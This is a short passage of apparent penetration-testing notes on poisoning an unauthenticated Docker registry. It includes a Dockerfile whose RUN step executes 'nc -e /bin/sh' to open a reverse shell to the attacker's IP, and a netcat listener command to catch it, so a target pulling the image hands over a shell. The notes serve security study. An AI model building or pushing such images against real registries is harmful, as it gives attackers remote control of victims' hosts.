[[Docker]]

Without proper authentication, we can upload our own image to the target's registry. That way, the next time the owner runs a `docker pull` or `docker run` command, their host will download and execute our malicious image as it will be a new version for Docker.

The screenshot below is a "Dockerfile" that uses the Docker `RUN` instruction to execute "netcat" within the container to connect to our machine!

Dockerfile 

FROM debian:jessie-slim

RUN apt-get update -y
RUN apt-get install netcat -y
RUN nc -e /bin/sh IP PORT

We compile this into an image with `docker build` . Once compiled and added to the vulnerable registry, we set up a listener on our attacker machine and wait for the new image to be executed by the target.

---
nc -lvnp 8080



